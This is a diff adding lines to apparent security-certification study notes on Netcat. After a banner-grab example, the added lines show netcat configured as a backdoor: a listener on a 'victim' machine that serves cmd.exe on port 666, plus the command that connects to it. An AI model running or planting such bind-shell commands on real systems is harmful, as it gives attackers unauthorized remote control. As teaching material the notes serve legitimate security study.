@@ -187,9 +187,20 @@
      
      <b>Pacu</b> - scanning and exploit tool for AWS (Amazon Web Service)
 <h3>Netcat</h3>
+     tool used to test network connectivity. netcat can write raw data over a connection
+
+     <b><i>echo "head" | nc 10.1.0.1 -v 80</i></b> this command attempts to connect to the HTTP port (80) and send the banner 'head' keyword
+
+  netcat can be configured as a backdoor:
+    - on the victim machine set up a 'listener': 
+       <b><i>nc -l -p 666 -e cmd.exe</i></b>
+
+    - the 'listener' grants access when this command is run:
+       <b><i>nc 10.1.0.1 666</i></b>  
 
 <h2>03B Explain Security Concerns with General Vulnerability Types</h2>    
 <h3>Software Vulnerabilities and Patch Management</h3>
+
 <h3>Zero-Day and Legacy Platform Vulnerabilities</h3>
 <h3>Weak Host Configurations</h3>
 <h3>Weak Network Configurations</h3>
